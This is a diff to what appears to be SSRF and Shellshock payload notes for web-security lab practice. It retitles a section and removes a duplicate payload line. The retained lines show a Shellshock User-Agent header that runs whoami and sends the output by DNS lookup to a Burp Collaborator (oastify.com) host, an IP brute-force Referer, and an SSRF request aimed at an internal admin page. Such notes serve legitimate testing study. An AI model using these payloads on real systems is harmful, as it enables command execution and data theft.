@@ -8,7 +8,7 @@ http://127.0.0.1/
 ```txt
 Host: burpcollaborator.net
 ```
-#### Shellshock exploitation
+#### Shellshock exploitation via SSRF
 ```txt
 User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3kobqoj8uv6qbwwlkaf5cvzr1i79v0jp.oastify.com >> Change Uger-Agent info
 Referer: http://192.168.0.$1$:8080 >> Bruteforce the ip
@@ -50,7 +50,4 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 118
 
 stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
-```
-```txt
-() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN >> For exploiting shellshock vulnerability via SSRF
 ```
